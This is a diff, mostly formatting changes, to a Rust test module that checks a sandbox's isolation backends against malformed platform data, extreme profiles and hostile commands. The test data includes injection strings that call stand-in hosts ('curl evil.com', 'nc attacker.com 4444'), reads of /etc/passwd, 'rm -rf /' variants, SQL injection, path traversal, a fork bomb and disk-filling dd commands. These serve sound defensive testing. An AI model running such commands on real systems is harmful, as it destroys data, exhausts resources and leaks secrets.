-                    let _result = inheritance_profile.allow_capability(&capability_name, AccessLevel::Execute);
+                    let capability_name = format!(
+                        "{}_{}_inheritance",
+                        source_backend.as_str(),
+                        inherited_capability
+                    );
+                    let _result = inheritance_profile
+                        .allow_capability(&capability_name, AccessLevel::Execute);
 
                     // Capability should not transfer between different backends
                     match compile_policy(&inheritance_profile) {
@@ -2135,7 +2329,7 @@ mod tests {
                             assert!(!policy_str.contains("hypervisor"));
                             assert!(!policy_str.contains("escape"));
                             assert!(!policy_str.contains("bypass"));
-                        },
+                        }
                         Err(_) => {
                             // Rejection of inherited dangerous capabilities is expected
                         }
@@ -2153,31 +2347,109 @@ mod tests {
         let malformed_capability_sets = vec![
             // Empty/minimal platform info
             PlatformCapabilities::from_values("", "", false, false, false, false, false, false),
-
             // Unicode and special characters in platform info
-            PlatformCapabilities::from_values("linux🐧", "x86_64🚀", true, true, true, true, false, true),
-            PlatformCapabilities::from_values("кибер-линукс", "архитектура", false, false, false, false, false, false),
-            PlatformCapabilities::from_values("攻击-系统", "处理器", true, false, true, false, true, false),
-
+            PlatformCapabilities::from_values(
+                "linux🐧",
+                "x86_64🚀",
+                true,
+                true,
+                true,
+                true,
+                false,
+                true,
+            ),
+            PlatformCapabilities::from_values(
+                "кибер-линукс",
+                "архитектура",
+                false,
+                false,
+                false,
+                false,
+                false,
+                false,
+            ),
+            PlatformCapabilities::from_values(
+                "攻击-系统",
+                "处理器",
+                true,
+                false,
+                true,
+                false,
+                true,
+                false,
+            ),
             // Control characters and injection attempts
-            PlatformCapabilities::from_values("linux\0", "x86_64\r\n", true, true, true, true, false, true),
-            PlatformCapabilities::from_values("linux\x1B[H", "x86_64; rm -rf /", false, false, false, false, false, false),
-
+            PlatformCapabilities::from_values(
+                "linux\0",
+                "x86_64\r\n",
+                true,
+                true,
+                true,
+                true,
+                false,
+                true,
+            ),
+            PlatformCapabilities::from_values(
+                "linux\x1B[H",
+                "x86_64; rm -rf /",
+                false,
+                false,
+                false,
+                false,
+                false,
+                false,
+            ),
             // Path traversal in platform strings
-            PlatformCapabilities::from_values("../../../etc/os-release", "../../../../proc/cpuinfo", false, false, false, false, false, false),
-
+            PlatformCapabilities::from_values(
+                "../../../etc/os-release",
+                "../../../../proc/cpuinfo",
+                false,
+                false,
+                false,
+                false,
+                false,
+                false,
+            ),
             // Script injection in platform info
-            PlatformCapabilities::from_values("linux'; DROP TABLE platforms; --", "x86_64 && curl evil.com", false, false, false, false, false, false),
-
+            PlatformCapabilities::from_values(
+                "linux'; DROP TABLE platforms; --",
+                "x86_64 && curl evil.com",
+                false,
+                false,
+                false,
+                false,
+                false,
+                false,
+            ),
             // Extremely long platform identifiers
-            PlatformCapabilities::from_values(&"linux".repeat(10000), &"x86_64".repeat(10000), true, true, true, true, true, true),
-
+            PlatformCapabilities::from_values(
+                &"linux".repeat(10000),
+                &"x86_64".repeat(10000),
+                true,
+                true,
+                true,
+                true,
+                true,
+                true,
+            ),
             // All capabilities enabled (potential over-privilege)
-            PlatformCapabilities::from_values("linux-ultimate", "x86_64-super", true, true, true, true, true, true),
-
+            PlatformCapabilities::from_values(
+                "linux-ultimate",
+                "x86_64-super",
+                true,
+                true,
+                true,
+                true,
+                true,
+                true,
+            ),
             // Contradictory capability combinations
-            PlatformCapabilities::from_values("windows", "arm64", true, true, true, true, true, true), // KVM on Windows
-            PlatformCapabilities::from_values("macos", "x86_64", true, true, true, true, false, true), // Linux features on macOS
+            PlatformCapabilities::from_values(
+                "windows", "arm64", true, true, true, true, true, true,
+            ), // KVM on Windows
+            PlatformCapabilities::from_values(
+                "macos", "x86_64", true, true, true, true, false, true,
+            ), // Linux features on macOS
         ];
 
         for (i, malformed_caps) in malformed_capability_sets.iter().enumerate() {
@@ -2190,7 +2462,12 @@ mod tests {
                     assert!(IsolationBackend::ALL.contains(&selection.backend));
 
                     // Verify equivalence level is valid
-                    assert!(matches!(selection.equivalence, EquivalenceLevel::Full | EquivalenceLevel::Equivalent | EquivalenceLevel::Fallback));
+                    assert!(matches!(
+                        selection.equivalence,
+                        EquivalenceLevel::Full
+                            | EquivalenceLevel::Equivalent
+                            | EquivalenceLevel::Fallback
+                    ));
 
                     // Test backend execution with malformed capabilities
                     let test_profile = SandboxProfile {
@@ -2215,12 +2492,12 @@ mod tests {
                     match execution_result {
                         Ok(_) => {
                             // Successful execution despite malformed platform
-                        },
+                        }
                         Err(_) => {
                             // Acceptable to fail with malformed platform info
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Expected for severely malformed capabilities
                 }
@@ -2242,7 +2519,6 @@ mod tests {
                 network_access: false,
                 temp_dir_access: false,
             },
-
             // Maximum resources (potential overflow)
             SandboxProfile {
                 name: "maximum-resources".to_string(),
@@ -2253,22 +2529,22 @@ mod tests {
                 network_access: true,
                 temp_dir_access: true,
             },
-
             // Massive capability sets
             SandboxProfile {
                 name: "capability-flood".to_string(),
                 base_capabilities: (0..10000).map(|i| format!("capability-{:06}", i)).collect(),
-                capability_grants: (0..5000).map(|i| CapabilityGrant {
-                    capability: format!("grant-{:06}", i),
-                    access_level: AccessLevel::ReadWrite,
-                    resource_pattern: format!("/massive/resource/path/{:06}/*", i),
-                }).collect(),
+                capability_grants: (0..5000)
+                    .map(|i| CapabilityGrant {
+                        capability: format!("grant-{:06}", i),
+                        access_level: AccessLevel::ReadWrite,
+                        resource_pattern: format!("/massive/resource/path/{:06}/*", i),
+                    })
+                    .collect(),
                 max_memory_mb: 1024 * 1024, // 1TB
-                max_cpu_percent: 10000, // Over 100%
+                max_cpu_percent: 10000,     // Over 100%
                 network_access: true,
                 temp_dir_access: true,
             },
-
             // Unicode and malicious content in profile
             SandboxProfile {
                 name: "unicode-attack🚀攻击кибер".to_string(),
@@ -2309,16 +2585,16 @@ mod tests {
 
                         // Execution time should be reasonable despite extreme profiles
                         assert!(result.execution_time < Duration::from_secs(5));
-                    },
+                    }
                     Err(IsolationError::InvalidProfile { .. }) => {
                         // Expected for extreme/malformed profiles
-                    },
+                    }
                     Err(IsolationError::ExecutionFailed { .. }) => {
                         // Expected for resource constraint violations
-                    },
+                    }
                     Err(IsolationError::Timeout) => {
                         // Expected for resource-starved profiles
-                    },
+                    }
                     Err(_) => {
                         // Other errors acceptable for extreme configurations
                     }
@@ -2346,33 +2622,29 @@ mod tests {
             ("/bin/echo", vec!["test && curl evil.com"]),
             ("/bin/echo", vec!["test | nc attacker.com 4444"]),
             ("/bin/echo", vec!["test; cat /etc/passwd"]),
-
             // Path traversal in command
             ("../../../bin/bash", vec!["-c", "echo pwned"]),
             ("../../../../usr/bin/whoami", vec![]),
             ("/proc/self/exe", vec![]),
-
             // Shell metacharacter injection
             ("/bin/echo", vec!["test$USER"]),
             ("/bin/echo", vec!["test`whoami`"]),
             ("/bin/echo", vec!["test$(id)"]),
-
             // Unicode and control character injection
             ("/bin/echo", vec!["test\0null"]),
             ("/bin/echo", vec!["test🚀unicode"]),
             ("/bin/echo", vec!["test\r\ncarriage"]),
             ("/bin/echo", vec!["test\x1B[Hescape"]),
-
             // Binary data injection
-            ("/bin/echo", vec![&String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC])]),
-
+            (
+                "/bin/echo",
+                vec![&String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC])],
+            ),
             // Extremely long arguments
             ("/bin/echo", vec![&"x".repeat(1000000)]),
-
             // Environment variable injection
             ("/usr/bin/env", vec!["MALICIOUS='; rm -rf /'"]),
             ("/usr/bin/env", vec!["PATH=../../../../bin"]),
-
             // Script file injection
             ("/bin/sh", vec!["-c", "echo 'malicious script'; exit 1"]),
         ];
@@ -2391,7 +2663,8 @@ mod tests {
                     Ok(result) => {
                         // If execution succeeded, verify it was properly sandboxed
                         // Should not contain evidence of successful injection
-                        let combined_output = format!("{}{}",
+                        let combined_output = format!(
+                            "{}{}",
                             String::from_utf8_lossy(&result.stdout),
                             String::from_utf8_lossy(&result.stderr)
                         );
@@ -2403,16 +2676,16 @@ mod tests {
 
                         // Execution time should be bounded (no hang)
                         assert!(result.execution_time < Duration::from_secs(2));
-                    },
+                    }
                     Err(IsolationError::InvalidProfile { .. }) => {
                         // Expected for malicious commands
-                    },
+                    }
                     Err(IsolationError::ExecutionFailed { .. }) => {
                         // Expected for sandboxed malicious commands
-                    },
+                    }
                     Err(IsolationError::Timeout) => {
                         // Expected if command hangs or is killed
-                    },
+                    }
                     Err(_) => {
                         // Other security-related errors are acceptable
                     }
@@ -2446,7 +2719,6 @@ mod tests {
                 network_access: false,
                 temp_dir_access: false,
             },
-
             // Path traversal in resource patterns
             SandboxProfile {
                 name: "path-traversal-escalation".to_string(),
@@ -2468,7 +2740,6 @@ mod tests {
                 network_access: false,
                 temp_dir_access: false,
             },
-
             // Wildcard abuse for privilege expansion
             SandboxProfile {
                 name: "wildcard-abuse".to_string(),
@@ -2490,7 +2761,6 @@ mod tests {
                 network_access: true, // Contradictory with grants
                 temp_dir_access: true,
             },
-
             // Unicode and injection in capability names
             SandboxProfile {
                 name: "capability-injection".to_string(),
@@ -2544,12 +2814,12 @@ mod tests {
                                 let output = String::from_utf8_lossy(&result.stdout);
                                 assert!(!output.contains("uid=0")); // Should not be root
                                 assert!(!output.contains("gid=0")); // Should not be root group
-                            },
+                            }
                             Err(_) => {
                                 // Expected for profiles with escalation attempts
                             }
                         }
-                    },
+                    }
                     Err(_) => {
                         // Expected for malformed or dangerous profiles
                     }
@@ -2565,7 +2835,7 @@ mod tests {
             name: "resource-attack".to_string(),
             base_capabilities: vec!["compute".to_string()],
             capability_grants: vec![],
-            max_memory_mb: 1, // Very low memory limit
+            max_memory_mb: 1,   // Very low memory limit
             max_cpu_percent: 1, // Very low CPU limit
             network_access: false,
             temp_dir_access: false,
@@ -2575,21 +2845,22 @@ mod tests {
             // CPU exhaustion
             ("/bin/bash", vec!["-c", "while true; do :; done"]),
             ("/usr/bin/yes", vec![]),
-
             // Memory exhaustion
-            ("/bin/bash", vec!["-c", "dd if=/dev/zero of=/dev/stdout bs=1M count=1000"]),
-
+            (
+                "/bin/bash",
+                vec!["-c", "dd if=/dev/zero of=/dev/stdout bs=1M count=1000"],
+            ),
             // Fork bomb
             ("/bin/bash", vec!["-c", ":(){ :|:& };:"]),
-
             // Infinite sleep
             ("/bin/sleep", vec!["3600"]),
-
             // File descriptor exhaustion
             ("/bin/bash", vec!["-c", "exec 3< /dev/zero; cat <&3"]),
-
             // Disk space exhaustion
-            ("/bin/dd", vec!["if=/dev/zero", "of=/tmp/huge", "bs=1M", "count=10000"]),
+            (
+                "/bin/dd",
+                vec!["if=/dev/zero", "of=/tmp/huge", "bs=1M", "count=10000"],
+            ),
         ];
 
         for backend in [IsolationBackend::Hardened, IsolationBackend::OsSandbox] {
@@ -2608,13 +2879,13 @@ mod tests {
                     Ok(result) => {
                         // Should complete quickly due to resource limits
                         assert!(result.execution_time <= Duration::from_millis(500));
-                    },
+                    }
                     Err(IsolationError::Timeout) => {
                         // Expected for resource exhaustion commands
-                    },
+                    }
                     Err(IsolationError::ExecutionFailed { .. }) => {
                         // Expected when resource limits prevent execution
-                    },
+                    }
                     Err(_) => {
                         // Other resource-related errors acceptable
                     }
@@ -2633,13 +2904,13 @@ mod tests {
                 match zero_timeout_result {
                     Ok(_) => {
                         // Unlikely but acceptable if execution is very fast
-                    },
+                    }
                     Err(IsolationError::Timeout) => {
                         // Expected for zero timeout
-                    },
+                    }
                     Err(IsolationError::InvalidProfile { .. }) => {
                         // May reject zero timeout as invalid
-                    },
+                    }
                     Err(_) => {
                         // Other errors acceptable for zero timeout
                     }
@@ -2663,19 +2934,17 @@ mod tests {
                 has_macos_sandbox: true, // Contradiction: macOS sandbox on Linux
                 has_oci_runtime: false,
             },
-
             // Platform/architecture mismatches
             PlatformCapabilities {
                 os: "windows".to_string(),
                 arch: "riscv64".to_string(), // Unusual combination
-                has_kvm: true, // Contradiction: KVM on Windows
-                has_seccomp: true, // Contradiction: seccomp on Windows
-                has_namespaces: true, // Contradiction: Linux namespaces on Windows
+                has_kvm: true,               // Contradiction: KVM on Windows
+                has_seccomp: true,           // Contradiction: seccomp on Windows
+                has_namespaces: true,        // Contradiction: Linux namespaces on Windows
                 has_cgroups: true,
                 has_macos_sandbox: false,
                 has_oci_runtime: true,
             },
-
             // All capabilities disabled (minimal system)
             PlatformCapabilities {
                 os: "unknown".to_string(),
@@ -2687,7 +2956,6 @@ mod tests {
                 has_macos_sandbox: false,
                 has_oci_runtime: false,
             },
-
             // All capabilities enabled (over-privileged)
             PlatformCapabilities {
                 os: "super-linux".to_string(),
@@ -2699,7 +2967,6 @@ mod tests {
                 has_macos_sandbox: true, // Contradiction on Linux
                 has_oci_runtime: true,
             },
-
             // Platform strings with special characters
             PlatformCapabilities {
                 os: "linux\0null".to_string(),
@@ -2726,7 +2993,7 @@ mod tests {
                         EquivalenceLevel::Full => {
                             // Should only claim full isolation with reliable platform data
                             assert_eq!(selection.backend, IsolationBackend::MicroVm);
-                        },
+                        }
                         EquivalenceLevel::Equivalent | EquivalenceLevel::Fallback => {
                             // Acceptable for corrupted platform data
                         }
@@ -2754,15 +3021,15 @@ mod tests {
                     match execution_result {
                         Ok(_) => {
                             // Backend works despite corrupted platform data
-                        },
+                        }
                         Err(_) => {
                             // Acceptable to fail with corrupted platform data
                         }
                     }
-                },
+                }
                 Err(IsolationError::NoPlatformSupport) => {
                     // Expected for severely corrupted platform data
-                },
+                }
                 Err(_) => {
                     // Other errors acceptable for corrupted input
                 }
@@ -2780,7 +3047,7 @@ mod tests {
             name: "concurrent-test".to_string(),
             base_capabilities: vec!["compute".to_string()],
             capability_grants: vec![],
-            max_memory_mb: 16, // Small memory limit
+            max_memory_mb: 16,   // Small memory limit
             max_cpu_percent: 10, // Small CPU limit
             network_access: false,
             temp_dir_access: false,
@@ -2790,32 +3057,34 @@ mod tests {
         let error_count = Arc::new(Mutex::new(0u32));
 
         // Spawn multiple concurrent executions
-        let handles: Vec<_> = (0..10).map(|i| {
-            let profile = concurrent_profile.clone();
-            let success_count = Arc::clone(&success_count);
-            let error_count = Arc::clone(&error_count);
+        let handles: Vec<_> = (0..10)
+            .map(|i| {
+                let profile = concurrent_profile.clone();
+                let success_count = Arc::clone(&success_count);
+                let error_count = Arc::clone(&error_count);
 
-            thread::spawn(move || {
-                let execution_result = execute_with_backend(
-                    IsolationBackend::Hardened,
-                    &profile,
-                    "/bin/echo",
-                    &[&format!("concurrent-{}", i)],
-                    Duration::from_millis(200),
-                );
+                thread::spawn(move || {
+                    let execution_result = execute_with_backend(
+                        IsolationBackend::Hardened,
+                        &profile,
+                        "/bin/echo",
+                        &[&format!("concurrent-{}", i)],
+                        Duration::from_millis(200),
+                    );
 
-                match execution_result {
-                    Ok(_) => {
-                        let mut count = success_count.lock().unwrap();
-                        *count = count.saturating_add(1);
-                    },
-                    Err(_) => {
-                        let mut count = error_count.lock().unwrap();
-                        *count = count.saturating_add(1);
+                    match execution_result {
+                        Ok(_) => {
+                            let mut count = success_count.lock().unwrap();
+                            *count = count.saturating_add(1);
+                        }
+                        Err(_) => {
+                            let mut count = error_count.lock().unwrap();
+                            *count = count.saturating_add(1);
+                        }
                     }
-                }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all threads to complete
         for handle in handles {
@@ -2832,28 +3101,30 @@ mod tests {
         assert!(final_success > 0 || final_errors == 10); // Either some success or all fail due to contention
 
         // Test resource exhaustion under concurrent load
-        let resource_exhaustion_handles: Vec<_> = (0..20).map(|i| {
-            let profile = SandboxProfile {
-                name: format!("resource-stress-{}", i),
-                base_capabilities: vec!["stress".to_string()],
-                capability_grants: vec![],
-                max_memory_mb: 1, // Very low limit
-                max_cpu_percent: 1, // Very low limit
-                network_access: false,
-                temp_dir_access: false,
-            };
+        let resource_exhaustion_handles: Vec<_> = (0..20)
+            .map(|i| {
+                let profile = SandboxProfile {
+                    name: format!("resource-stress-{}", i),
+                    base_capabilities: vec!["stress".to_string()],
+                    capability_grants: vec![],
+                    max_memory_mb: 1,   // Very low limit
+                    max_cpu_percent: 1, // Very low limit
+                    network_access: false,
+                    temp_dir_access: false,
+                };
 
-            thread::spawn(move || {
-                let _result = execute_with_backend(
-                    IsolationBackend::OsSandbox,
-                    &profile,
-                    "/bin/bash",
-                    &["-c", "for i in {1..1000}; do echo $i; done"],
-                    Duration::from_millis(50), // Very short timeout
-                );
-                // Results may vary due to resource contention
+                thread::spawn(move || {
+                    let _result = execute_with_backend(
+                        IsolationBackend::OsSandbox,
+                        &profile,
+                        "/bin/bash",
+                        &["-c", "for i in {1..1000}; do echo $i; done"],
+                        Duration::from_millis(50), // Very short timeout
+                    );
+                    // Results may vary due to resource contention
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for resource stress test to complete
         for handle in resource_exhaustion_handles {
@@ -2873,7 +3144,7 @@ mod tests {
         match post_stress_result {
             Ok(_) => {
                 // System recovered from stress
-            },
+            }
             Err(_) => {
                 // May still be under resource pressure
             }
@@ -2896,31 +3167,34 @@ mod tests {
         let output_corruption_commands = vec![
             // Binary output that might corrupt parsing
             ("/bin/bash", vec!["-c", "printf '\\xff\\xfe\\xfd\\xfc'"]),
-
             // Null bytes in output
             ("/bin/bash", vec!["-c", "printf 'before\\x00after'"]),
-
             // Extremely large output
             ("/bin/bash", vec!["-c", "head -c 1048576 /dev/zero"]), // 1MB of zeros
-
             // Unicode output with potential normalization issues
             ("/bin/bash", vec!["-c", "echo '🚀攻击кибер'"]),
-
             // Control characters in output
             ("/bin/bash", vec!["-c", "printf '\\x1b[H\\x1b[2J\\r\\n'"]),
-
             // Output that looks like command injection
-            ("/bin/bash", vec!["-c", "echo '; rm -rf /' && echo 'after injection'"]),
-
+            (
+                "/bin/bash",
+                vec!["-c", "echo '; rm -rf /' && echo 'after injection'"],
+            ),
             // JSON-like output that might confuse parsers
-            ("/bin/bash", vec!["-c", "echo '{\"malicious\": true, \"inject\": \"</script>\"}'"]),
-
+            (
+                "/bin/bash",
+                vec![
+                    "-c",
+                    "echo '{\"malicious\": true, \"inject\": \"</script>\"}'",
+                ],
+            ),
             // Extremely long lines
-            ("/bin/bash", vec!["-c", &format!("echo '{}'", "x".repeat(100000))]),
-
+            (
+                "/bin/bash",
+                vec!["-c", &format!("echo '{}'", "x".repeat(100000))],
+            ),
             // Mixed stdout/stderr output
             ("/bin/bash", vec!["-c", "echo 'stdout'; echo 'stderr' >&2"]),
-
             // Output with path traversal patterns
             ("/bin/bash", vec!["-c", "echo '../../../etc/passwd'"]),
         ];
@@ -2956,13 +3230,13 @@ mod tests {
                         // Combined output should be reasonable size
                         let total_output_size = result.stdout.len() + result.stderr.len();
                         assert!(total_output_size <= 20 * 1024 * 1024); // Max 20MB total
-                    },
+                    }
                     Err(IsolationError::ExecutionFailed { .. }) => {
                         // Expected for commands that fail due to sandboxing
-                    },
+                    }
                     Err(IsolationError::Timeout) => {
                         // Expected for commands that take too long
-                    },
+                    }
                     Err(_) => {
                         // Other errors acceptable for potentially malicious output
                     }
